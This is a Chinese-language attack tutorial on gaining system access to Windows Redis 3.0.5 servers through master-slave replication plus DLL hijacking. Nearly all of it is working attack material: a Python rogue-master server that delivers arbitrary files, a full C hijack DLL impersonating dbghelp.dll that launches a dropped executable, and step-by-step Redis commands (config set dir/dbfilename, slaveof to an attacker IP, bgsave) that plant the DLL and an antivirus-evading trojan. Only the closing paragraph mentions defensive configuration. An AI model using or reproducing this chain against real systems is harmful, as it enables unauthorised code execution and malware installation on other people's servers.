## Windows利用 Redis 主从复制获取系统权限

redis在Linux中获取权限的办法较多，而在windows中Linux的那些获取权限的办法基本无法使用，在windows获取权限比较通用的是主从复制这个方法。

### 1. 主从复制在windows中的问题

1. 在内网中最常见的是[redis3.0.5]([microsoftarchive/redis: Redis is an in-memory database that persists on disk. The data model is key-value, but many different kind of values are supported: Strings, Lists, Sets, Sorted Sets, Hashes](https://github.com/microsoftarchive/redis))版本及以下，在Linux中的主从复制使用了module这个功能，通过主从复制向redis添加一个可执行命令的函数实现攻击，而module这个功能在redis4这个版本中引入的，所以在redis3中无法通过module添加执行命令函数。
2. redis4可以使用module添加执行命令函数，但是需要编写执行命令的dll文件，尝试写过相应的dll，dll非常容易导致redis服务挂掉。

### 2. 使用dll劫持解决无module功能

​	windows下的redis存在dll劫持漏洞(仅测试[redis3.0.5]([microsoftarchive/redis: Redis is an in-memory database that persists on disk. The data model is key-value, but many different kind of values are supported: Strings, Lists, Sets, Sorted Sets, Hashes](https://github.com/microsoftarchive/redis)))，这个时候就可以绕过module这个限制，利用dll劫持这个漏洞加载我们的dll文件。

### 3. 攻击步骤演示

#### 3.1 搭建一个恶意的redis

python redis.py --lport 6379 -f dbghelp.dll

代码如下

```python
import socket
from time import sleep
from optparse import OptionParser

def RogueServer(lport):
    CLRF = "\r\n"
    resp = b""
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind(("0.0.0.0", lport))
    sock.listen(10)
    conn, address = sock.accept()  
    sleep(5)
    while True:
        data = conn.recv(1024)
        data = data.decode()
        if "PING" in data:
            resp = ("+PONG" + CLRF).encode()
            conn.send(resp)
        elif "REPLCONF" in data:
            resp = ("+OK" + CLRF).encode()
            conn.send(resp)
        elif "PSYNC" in data or "SYNC" in data:
            resp = ("+FULLRESYNC " + "Z" * 40 + " 1" + CLRF).encode()
            resp += ("$" + str(len(payload)) + CLRF).encode()
            resp += payload + CLRF.encode()
            conn.send(resp)
        else:
            break

if __name__ == "__main__":

    parser = OptionParser()                     
    parser.add_option("--lport", dest="lp", type="int", help="rogue server listen port, default 6379", default=6379, metavar="LOCAL_PORT")        
    parser.add_option("-f", "--exp", dest="exp", type="string", help="Redis Module to load, default exp.so", default="exp.so", metavar="EXP_FILE")            

    (options, args) = parser.parse_args()
    lport = options.lp
    exp_filename = options.exp

    CLRF = "\r\n"
    with open(exp_filename, "rb") as f:
        payload = f.read()
    print("Start listening on port: %s" % lport)
    print("Load the payload: %s" % exp_filename)
    RogueServer(lport)
```

### 3.2 编写dll代码

网上有些文章会直接加载cs的shellcode，这种方式有概率会导致redis-server服务挂掉，所以我这里通过创建进程实现。使用[dll_hack](https://github.com/JKme/sb_kiddie-/tree/master/hacking_win/dll_hijack)创建vs项目`python dll_hack.py C:\windows\system32\dbghelp.dll`这个dll直接在操作系统中搜索就能找到。创建好项目后使用以下代码实现创建进程，就算创建失败也不会导致redis挂掉。

```c

#include "dbghelp.h"

TCHAR tzPath[MAX_PATH];
HMODULE sysdll;

VOID TestCreateProcessByAppName() {


	STARTUPINFO si = { 0 };
	PROCESS_INFORMATION pi;
	si.cb = sizeof(si);
	TCHAR szAppName[] = TEXT("C:\\users\\public\\IconCache.exe");
	BOOL bRes = CreateProcess(szAppName, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi);
}

BOOL APIENTRY DllMain( HMODULE hModule,
                       DWORD  ul_reason_for_call,
                       LPVOID lpReserved
                     )
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
		GetSystemDirectory(tzPath, MAX_PATH);
		lstrcat(tzPath, TEXT("\\dbghelp"));
		sysdll = LoadLibrary(tzPath);
		g_DbgHelpCreateUserDump = GetProcAddress(sysdll, "DbgHelpCreateUserDump");
		g_DbgHelpCreateUserDumpW = GetProcAddress(sysdll, "DbgHelpCreateUserDumpW");
		g_EnumDirTree = GetProcAddress(sysdll, "EnumDirTree");
		g_EnumDirTreeW = GetProcAddress(sysdll, "EnumDirTreeW");
		g_EnumerateLoadedModules = GetProcAddress(sysdll, "EnumerateLoadedModules");
		g_EnumerateLoadedModules64 = GetProcAddress(sysdll, "EnumerateLoadedModules64");
		g_EnumerateLoadedModulesEx = GetProcAddress(sysdll, "EnumerateLoadedModulesEx");
		g_EnumerateLoadedModulesExW = GetProcAddress(sysdll, "EnumerateLoadedModulesExW");
		g_EnumerateLoadedModulesW64 = GetProcAddress(sysdll, "EnumerateLoadedModulesW64");
		g_ExtensionApiVersion = GetProcAddress(sysdll, "ExtensionApiVersion");
		g_FindDebugInfoFile = GetProcAddress(sysdll, "FindDebugInfoFile");
		g_FindDebugInfoFileEx = GetProcAddress(sysdll, "FindDebugInfoFileEx");
		g_FindDebugInfoFileExW = GetProcAddress(sysdll, "FindDebugInfoFileExW");
		g_FindExecutableImage = GetProcAddress(sysdll, "FindExecutableImage");
		g_FindExecutableImageEx = GetProcAddress(sysdll, "FindExecutableImageEx");
		g_FindExecutableImageExW = GetProcAddress(sysdll, "FindExecutableImageExW");
		g_FindFileInPath = GetProcAddress(sysdll, "FindFileInPath");
		g_FindFileInSearchPath = GetProcAddress(sysdll, "FindFileInSearchPath");
		g_GetSymLoadError = GetProcAddress(sysdll, "GetSymLoadError");
		g_GetTimestampForLoadedLibrary = GetProcAddress(sysdll, "GetTimestampForLoadedLibrary");
		g_ImageDirectoryEntryToData = GetProcAddress(sysdll, "ImageDirectoryEntryToData");
		g_ImageDirectoryEntryToDataEx = GetProcAddress(sysdll, "ImageDirectoryEntryToDataEx");
		g_ImageNtHeader = GetProcAddress(sysdll, "ImageNtHeader");
		g_ImageRvaToSection = GetProcAddress(sysdll, "ImageRvaToSection");
		g_ImageRvaToVa = GetProcAddress(sysdll, "ImageRvaToVa");
		g_ImagehlpApiVersion = GetProcAddress(sysdll, "ImagehlpApiVersion");
		g_ImagehlpApiVersionEx = GetProcAddress(sysdll, "ImagehlpApiVersionEx");
		g_MakeSureDirectoryPathExists = GetProcAddress(sysdll, "MakeSureDirectoryPathExists");
		g_MiniDumpReadDumpStream = GetProcAddress(sysdll, "MiniDumpReadDumpStream");
		g_MiniDumpWriteDump = GetProcAddress(sysdll, "MiniDumpWriteDump");
		g_RangeMapAddPeImageSections = GetProcAddress(sysdll, "RangeMapAddPeImageSections");
		g_RangeMapCreate = GetProcAddress(sysdll, "RangeMapCreate");
		g_RangeMapFree = GetProcAddress(sysdll, "RangeMapFree");
		g_RangeMapRead = GetProcAddress(sysdll, "RangeMapRead");
		g_RangeMapRemove = GetProcAddress(sysdll, "RangeMapRemove");
		g_RangeMapWrite = GetProcAddress(sysdll, "RangeMapWrite");
		g_RemoveInvalidModuleList = GetProcAddress(sysdll, "RemoveInvalidModuleList");
		g_ReportSymbolLoadSummary = GetProcAddress(sysdll, "ReportSymbolLoadSummary");
		g_SearchTreeForFile = GetProcAddress(sysdll, "SearchTreeForFile");
		g_SearchTreeForFileW = GetProcAddress(sysdll, "SearchTreeForFileW");
		g_SetCheckUserInterruptShared = GetProcAddress(sysdll, "SetCheckUserInterruptShared");
		g_SetSymLoadError = GetProcAddress(sysdll, "SetSymLoadError");
		g_StackWalk = GetProcAddress(sysdll, "StackWalk");
		g_StackWalk64 = GetProcAddress(sysdll, "StackWalk64");
		g_StackWalkEx = GetProcAddress(sysdll, "StackWalkEx");
		g_SymAddSourceStream = GetProcAddress(sysdll, "SymAddSourceStream");
		g_SymAddSourceStreamA = GetProcAddress(sysdll, "SymAddSourceStreamA");
		g_SymAddSourceStreamW = GetProcAddress(sysdll, "SymAddSourceStreamW");
		g_SymAddSymbol = GetProcAddress(sysdll, "SymAddSymbol");
		g_SymAddSymbolW = GetProcAddress(sysdll, "SymAddSymbolW");
		g_SymAddrIncludeInlineTrace = GetProcAddress(sysdll, "SymAddrIncludeInlineTrace");
		g_SymAllocDiaString = GetProcAddress(sysdll, "SymAllocDiaString");
		g_SymCleanup = GetProcAddress(sysdll, "SymCleanup");
		g_SymCompareInlineTrace = GetProcAddress(sysdll, "SymCompareInlineTrace");
		g_SymDeleteSymbol = GetProcAddress(sysdll, "SymDeleteSymbol");
		g_SymDeleteSymbolW = GetProcAddress(sysdll, "SymDeleteSymbolW");
		g_SymEnumLines = GetProcAddress(sysdll, "SymEnumLines");
		g_SymEnumLinesW = GetProcAddress(sysdll, "SymEnumLinesW");
		g_SymEnumProcesses = GetProcAddress(sysdll, "SymEnumProcesses");
		g_SymEnumSourceFileTokens = GetProcAddress(sysdll, "SymEnumSourceFileTokens");
		g_SymEnumSourceFiles = GetProcAddress(sysdll, "SymEnumSourceFiles");
		g_SymEnumSourceFilesW = GetProcAddress(sysdll, "SymEnumSourceFilesW");
		g_SymEnumSourceLines = GetProcAddress(sysdll, "SymEnumSourceLines");
		g_SymEnumSourceLinesW = GetProcAddress(sysdll, "SymEnumSourceLinesW");
		g_SymEnumSym = GetProcAddress(sysdll, "SymEnumSym");
		g_SymEnumSymbols = GetProcAddress(sysdll, "SymEnumSymbols");
		g_SymEnumSymbolsEx = GetProcAddress(sysdll, "SymEnumSymbolsEx");
		g_SymEnumSymbolsExW = GetProcAddress(sysdll, "SymEnumSymbolsExW");
		g_SymEnumSymbolsForAddr = GetProcAddress(sysdll, "SymEnumSymbolsForAddr");
		g_SymEnumSymbolsForAddrW = GetProcAddress(sysdll, "SymEnumSymbolsForAddrW");
		g_SymEnumSymbolsW = GetProcAddress(sysdll, "SymEnumSymbolsW");
		g_SymEnumTypes = GetProcAddress(sysdll, "SymEnumTypes");
		g_SymEnumTypesByName = GetProcAddress(sysdll, "SymEnumTypesByName");
		g_SymEnumTypesByNameW = GetProcAddress(sysdll, "SymEnumTypesByNameW");
		g_SymEnumTypesW = GetProcAddress(sysdll, "SymEnumTypesW");
		g_SymEnumerateModules = GetProcAddress(sysdll, "SymEnumerateModules");
		g_SymEnumerateModules64 = GetProcAddress(sysdll, "SymEnumerateModules64");
		g_SymEnumerateModulesW64 = GetProcAddress(sysdll, "SymEnumerateModulesW64");
		g_SymEnumerateSymbols = GetProcAddress(sysdll, "SymEnumerateSymbols");
		g_SymEnumerateSymbols64 = GetProcAddress(sysdll, "SymEnumerateSymbols64");
		g_SymEnumerateSymbolsW = GetProcAddress(sysdll, "SymEnumerateSymbolsW");
		g_SymEnumerateSymbolsW64 = GetProcAddress(sysdll, "SymEnumerateSymbolsW64");
		g_SymFindDebugInfoFile = GetProcAddress(sysdll, "SymFindDebugInfoFile");
		g_SymFindDebugInfoFileW = GetProcAddress(sysdll, "SymFindDebugInfoFileW");
		g_SymFindExecutableImage = GetProcAddress(sysdll, "SymFindExecutableImage");
		g_SymFindExecutableImageW = GetProcAddress(sysdll, "SymFindExecutableImageW");
		g_SymFindFileInPath = GetProcAddress(sysdll, "SymFindFileInPath");
		g_SymFindFileInPathW = GetProcAddress(sysdll, "SymFindFileInPathW");
		g_SymFreeDiaString = GetProcAddress(sysdll, "SymFreeDiaString");
		g_SymFromAddr = GetProcAddress(sysdll, "SymFromAddr");
		g_SymFromAddrW = GetProcAddress(sysdll, "SymFromAddrW");
		g_SymFromIndex = GetProcAddress(sysdll, "SymFromIndex");
		g_SymFromIndexW = GetProcAddress(sysdll, "SymFromIndexW");
		g_SymFromInlineContext = GetProcAddress(sysdll, "SymFromInlineContext");
		g_SymFromInlineContextW = GetProcAddress(sysdll, "SymFromInlineContextW");
		g_SymFromName = GetProcAddress(sysdll, "SymFromName");
		g_SymFromNameW = GetProcAddress(sysdll, "SymFromNameW");
		g_SymFromToken = GetProcAddress(sysdll, "SymFromToken");
		g_SymFromTokenW = GetProcAddress(sysdll, "SymFromTokenW");
		g_SymFunctionTableAccess = GetProcAddress(sysdll, "SymFunctionTableAccess");
		g_SymFunctionTableAccess64 = GetProcAddress(sysdll, "SymFunctionTableAccess64");
		g_SymFunctionTableAccess64AccessRoutines = GetProcAddress(sysdll, "SymFunctionTableAccess64AccessRoutines");
		g_SymGetDiaSession = GetProcAddress(sysdll, "SymGetDiaSession");
		g_SymGetExtendedOption = GetProcAddress(sysdll, "SymGetExtendedOption");
		g_SymGetFileLineOffsets64 = GetProcAddress(sysdll, "SymGetFileLineOffsets64");
		g_SymGetHomeDirectory = GetProcAddress(sysdll, "SymGetHomeDirectory");
		g_SymGetHomeDirectoryW = GetProcAddress(sysdll, "SymGetHomeDirectoryW");
		g_SymGetLineFromAddr = GetProcAddress(sysdll, "SymGetLineFromAddr");
		g_SymGetLineFromAddr64 = GetProcAddress(sysdll, "SymGetLineFromAddr64");
		g_SymGetLineFromAddrEx = GetProcAddress(sysdll, "SymGetLineFromAddrEx");
		g_SymGetLineFromAddrW64 = GetProcAddress(sysdll, "SymGetLineFromAddrW64");
		g_SymGetLineFromInlineContext = GetProcAddress(sysdll, "SymGetLineFromInlineContext");
		g_SymGetLineFromInlineContextW = GetProcAddress(sysdll, "SymGetLineFromInlineContextW");
		g_SymGetLineFromName = GetProcAddress(sysdll, "SymGetLineFromName");
		g_SymGetLineFromName64 = GetProcAddress(sysdll, "SymGetLineFromName64");
		g_SymGetLineFromNameEx = GetProcAddress(sysdll, "SymGetLineFromNameEx");
		g_SymGetLineFromNameW64 = GetProcAddress(sysdll, "SymGetLineFromNameW64");
		g_SymGetLineNext = GetProcAddress(sysdll, "SymGetLineNext");
		g_SymGetLineNext64 = GetProcAddress(sysdll, "SymGetLineNext64");
		g_SymGetLineNextEx = GetProcAddress(sysdll, "SymGetLineNextEx");
		g_SymGetLineNextW64 = GetProcAddress(sysdll, "SymGetLineNextW64");
		g_SymGetLinePrev = GetProcAddress(sysdll, "SymGetLinePrev");
		g_SymGetLinePrev64 = GetProcAddress(sysdll, "SymGetLinePrev64");
		g_SymGetLinePrevEx = GetProcAddress(sysdll, "SymGetLinePrevEx");
		g_SymGetLinePrevW64 = GetProcAddress(sysdll, "SymGetLinePrevW64");
		g_SymGetModuleBase = GetProcAddress(sysdll, "SymGetModuleBase");
		g_SymGetModuleBase64 = GetProcAddress(sysdll, "SymGetModuleBase64");
		g_SymGetModuleInfo = GetProcAddress(sysdll, "SymGetModuleInfo");
		g_SymGetModuleInfo64 = GetProcAddress(sysdll, "SymGetModuleInfo64");
		g_SymGetModuleInfoW = GetProcAddress(sysdll, "SymGetModuleInfoW");
		g_SymGetModuleInfoW64 = GetProcAddress(sysdll, "SymGetModuleInfoW64");
		g_SymGetOmapBlockBase = GetProcAddress(sysdll, "SymGetOmapBlockBase");
		g_SymGetOmaps = GetProcAddress(sysdll, "SymGetOmaps");
		g_SymGetOptions = GetProcAddress(sysdll, "SymGetOptions");
		g_SymGetScope = GetProcAddress(sysdll, "SymGetScope");
		g_SymGetScopeW = GetProcAddress(sysdll, "SymGetScopeW");
		g_SymGetSearchPath = GetProcAddress(sysdll, "SymGetSearchPath");
		g_SymGetSearchPathW = GetProcAddress(sysdll, "SymGetSearchPathW");
		g_SymGetSourceFile = GetProcAddress(sysdll, "SymGetSourceFile");
		g_SymGetSourceFileChecksum = GetProcAddress(sysdll, "SymGetSourceFileChecksum");
		g_SymGetSourceFileChecksumW = GetProcAddress(sysdll, "SymGetSourceFileChecksumW");
		g_SymGetSourceFileFromToken = GetProcAddress(sysdll, "SymGetSourceFileFromToken");
		g_SymGetSourceFileFromTokenW = GetProcAddress(sysdll, "SymGetSourceFileFromTokenW");
		g_SymGetSourceFileToken = GetProcAddress(sysdll, "SymGetSourceFileToken");
		g_SymGetSourceFileTokenW = GetProcAddress(sysdll, "SymGetSourceFileTokenW");
		g_SymGetSourceFileW = GetProcAddress(sysdll, "SymGetSourceFileW");
		g_SymGetSourceVarFromToken = GetProcAddress(sysdll, "SymGetSourceVarFromToken");
		g_SymGetSourceVarFromTokenW = GetProcAddress(sysdll, "SymGetSourceVarFromTokenW");
		g_SymGetSymFromAddr = GetProcAddress(sysdll, "SymGetSymFromAddr");
		g_SymGetSymFromAddr64 = GetProcAddress(sysdll, "SymGetSymFromAddr64");
		g_SymGetSymFromName = GetProcAddress(sysdll, "SymGetSymFromName");
		g_SymGetSymFromName64 = GetProcAddress(sysdll, "SymGetSymFromName64");
		g_SymGetSymNext = GetProcAddress(sysdll, "SymGetSymNext");
		g_SymGetSymNext64 = GetProcAddress(sysdll, "SymGetSymNext64");
		g_SymGetSymPrev = GetProcAddress(sysdll, "SymGetSymPrev");
		g_SymGetSymPrev64 = GetProcAddress(sysdll, "SymGetSymPrev64");
		g_SymGetSymbolFile = GetProcAddress(sysdll, "SymGetSymbolFile");
		g_SymGetSymbolFileW = GetProcAddress(sysdll, "SymGetSymbolFileW");
		g_SymGetTypeFromName = GetProcAddress(sysdll, "SymGetTypeFromName");
		g_SymGetTypeFromNameW = GetProcAddress(sysdll, "SymGetTypeFromNameW");
		g_SymGetTypeInfo = GetProcAddress(sysdll, "SymGetTypeInfo");
		g_SymGetTypeInfoEx = GetProcAddress(sysdll, "SymGetTypeInfoEx");
		g_SymGetUnwindInfo = GetProcAddress(sysdll, "SymGetUnwindInfo");
		g_SymInitialize = GetProcAddress(sysdll, "SymInitialize");
		g_SymInitializeW = GetProcAddress(sysdll, "SymInitializeW");
		g_SymLoadModule = GetProcAddress(sysdll, "SymLoadModule");
		g_SymLoadModule64 = GetProcAddress(sysdll, "SymLoadModule64");
		g_SymLoadModuleEx = GetProcAddress(sysdll, "SymLoadModuleEx");
		g_SymLoadModuleExW = GetProcAddress(sysdll, "SymLoadModuleExW");
		g_SymMatchFileName = GetProcAddress(sysdll, "SymMatchFileName");
		g_SymMatchFileNameW = GetProcAddress(sysdll, "SymMatchFileNameW");
		g_SymMatchString = GetProcAddress(sysdll, "SymMatchString");
		g_SymMatchStringA = GetProcAddress(sysdll, "SymMatchStringA");
		g_SymMatchStringW = GetProcAddress(sysdll, "SymMatchStringW");
		g_SymNext = GetProcAddress(sysdll, "SymNext");
		g_SymNextW = GetProcAddress(sysdll, "SymNextW");
		g_SymPrev = GetProcAddress(sysdll, "SymPrev");
		g_SymPrevW = GetProcAddress(sysdll, "SymPrevW");
		g_SymQueryInlineTrace = GetProcAddress(sysdll, "SymQueryInlineTrace");
		g_SymRefreshModuleList = GetProcAddress(sysdll, "SymRefreshModuleList");
		g_SymRegisterCallback = GetProcAddress(sysdll, "SymRegisterCallback");
		g_SymRegisterCallback64 = GetProcAddress(sysdll, "SymRegisterCallback64");
		g_SymRegisterCallbackW64 = GetProcAddress(sysdll, "SymRegisterCallbackW64");
		g_SymRegisterFunctionEntryCallback = GetProcAddress(sysdll, "SymRegisterFunctionEntryCallback");
		g_SymRegisterFunctionEntryCallback64 = GetProcAddress(sysdll, "SymRegisterFunctionEntryCallback64");
		g_SymSearch = GetProcAddress(sysdll, "SymSearch");
		g_SymSearchW = GetProcAddress(sysdll, "SymSearchW");
		g_SymSetContext = GetProcAddress(sysdll, "SymSetContext");
		g_SymSetDiaSession = GetProcAddress(sysdll, "SymSetDiaSession");
		g_SymSetExtendedOption = GetProcAddress(sysdll, "SymSetExtendedOption");
		g_SymSetHomeDirectory = GetProcAddress(sysdll, "SymSetHomeDirectory");
		g_SymSetHomeDirectoryW = GetProcAddress(sysdll, "SymSetHomeDirectoryW");
		g_SymSetOptions = GetProcAddress(sysdll, "SymSetOptions");
		g_SymSetParentWindow = GetProcAddress(sysdll, "SymSetParentWindow");
		g_SymSetScopeFromAddr = GetProcAddress(sysdll, "SymSetScopeFromAddr");
		g_SymSetScopeFromIndex = GetProcAddress(sysdll, "SymSetScopeFromIndex");
		g_SymSetScopeFromInlineContext = GetProcAddress(sysdll, "SymSetScopeFromInlineContext");
		g_SymSetSearchPath = GetProcAddress(sysdll, "SymSetSearchPath");
		g_SymSetSearchPathW = GetProcAddress(sysdll, "SymSetSearchPathW");
		g_SymSrvDeltaName = GetProcAddress(sysdll, "SymSrvDeltaName");
		g_SymSrvDeltaNameW = GetProcAddress(sysdll, "SymSrvDeltaNameW");
		g_SymSrvGetFileIndexInfo = GetProcAddress(sysdll, "SymSrvGetFileIndexInfo");
		g_SymSrvGetFileIndexInfoW = GetProcAddress(sysdll, "SymSrvGetFileIndexInfoW");
		g_SymSrvGetFileIndexString = GetProcAddress(sysdll, "SymSrvGetFileIndexString");
		g_SymSrvGetFileIndexStringW = GetProcAddress(sysdll, "SymSrvGetFileIndexStringW");
		g_SymSrvGetFileIndexes = GetProcAddress(sysdll, "SymSrvGetFileIndexes");
		g_SymSrvGetFileIndexesW = GetProcAddress(sysdll, "SymSrvGetFileIndexesW");
		g_SymSrvGetSupplement = GetProcAddress(sysdll, "SymSrvGetSupplement");
		g_SymSrvGetSupplementW = GetProcAddress(sysdll, "SymSrvGetSupplementW");
		g_SymSrvIsStore = GetProcAddress(sysdll, "SymSrvIsStore");
		g_SymSrvIsStoreW = GetProcAddress(sysdll, "SymSrvIsStoreW");
		g_SymSrvStoreFile = GetProcAddress(sysdll, "SymSrvStoreFile");
		g_SymSrvStoreFileW = GetProcAddress(sysdll, "SymSrvStoreFileW");
		g_SymSrvStoreSupplement = GetProcAddress(sysdll, "SymSrvStoreSupplement");
		g_SymSrvStoreSupplementW = GetProcAddress(sysdll, "SymSrvStoreSupplementW");
		g_SymUnDName = GetProcAddress(sysdll, "SymUnDName");
		g_SymUnDName64 = GetProcAddress(sysdll, "SymUnDName64");
		g_SymUnloadModule = GetProcAddress(sysdll, "SymUnloadModule");
		g_SymUnloadModule64 = GetProcAddress(sysdll, "SymUnloadModule64");
		g_UnDecorateSymbolName = GetProcAddress(sysdll, "UnDecorateSymbolName");
		g_UnDecorateSymbolNameW = GetProcAddress(sysdll, "UnDecorateSymbolNameW");
		g_WinDbgExtensionDllInit = GetProcAddress(sysdll, "WinDbgExtensionDllInit");
		g__EFN_DumpImage = GetProcAddress(sysdll, "_EFN_DumpImage");
		g_block = GetProcAddress(sysdll, "block");
		g_chksym = GetProcAddress(sysdll, "chksym");
		g_dbghelp = GetProcAddress(sysdll, "dbghelp");
		g_dh = GetProcAddress(sysdll, "dh");
		g_fptr = GetProcAddress(sysdll, "fptr");
		g_homedir = GetProcAddress(sysdll, "homedir");
		g_inlinedbg = GetProcAddress(sysdll, "inlinedbg");
		g_itoldyouso = GetProcAddress(sysdll, "itoldyouso");
		g_lmi = GetProcAddress(sysdll, "lmi");
		g_lminfo = GetProcAddress(sysdll, "lminfo");
		g_omap = GetProcAddress(sysdll, "omap");
		g_optdbgdump = GetProcAddress(sysdll, "optdbgdump");
		g_optdbgdumpaddr = GetProcAddress(sysdll, "optdbgdumpaddr");
		g_srcfiles = GetProcAddress(sysdll, "srcfiles");
		g_stack_force_ebp = GetProcAddress(sysdll, "stack_force_ebp");
		g_stackdbg = GetProcAddress(sysdll, "stackdbg");
		g_sym = GetProcAddress(sysdll, "sym");
		g_symsrv = GetProcAddress(sysdll, "symsrv");
		g_vc7fpo = GetProcAddress(sysdll, "vc7fpo");
		TestCreateProcessByAppName();
    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
    case DLL_PROCESS_DETACH:
        break;
    }
    return TRUE;
}
```

#### 3.2 上传dll到redis

攻击者连接 Redis 服务，并执行以下命令将目标 Redis 设置为攻击者控制的从节点。

```
#设置redis的备份路径为当前目录
    config set dir ./
#设置备份文件名为dbghelp.dll，默认为dump.rdb
    config set dbfilename dbghelp.dll
#设置主服务器IP和端口
    slaveof 192.168.172.129 6379
#服务端断开后
    config set dbfilename dump.rdb
#切断主从，关闭复制功能
    slaveof no one 
```

#### 3.3上传免杀的exe木马（自备）

python redis.py --lport 6379 -f IconCache.exe

```
#设置redis的备份路径为当前目录
    config set dir C:\Users\Public
#设置备份文件名为IconCache.exe，默认为dump.rdb
    config set dbfilename IconCache.exe
#设置主服务器IP和端口
    slaveof 192.168.172.129 6379
#服务端断开后
	config set dir ./
    config set dbfilename dump.rdb
#切断主从，关闭复制功能
    slaveof no one 
#调用dbghelp.dll
	bgsave
```

如果不上线可能是exe被杀，或者在服务端断开后没重，文件名导致有垃圾数据替换到文件中，可以多尝试两次。

------

### 结语

Redis 的主从复制功能本质上为 Redis 的高可用性提供了便利，但在默认安全配置不足的情况下，这一特性也为攻击者提供了权限提升的机会。希望本文能够帮助读者更好地理解 Redis 安全配置的重要性，从而在实际部署中规避类似的风险。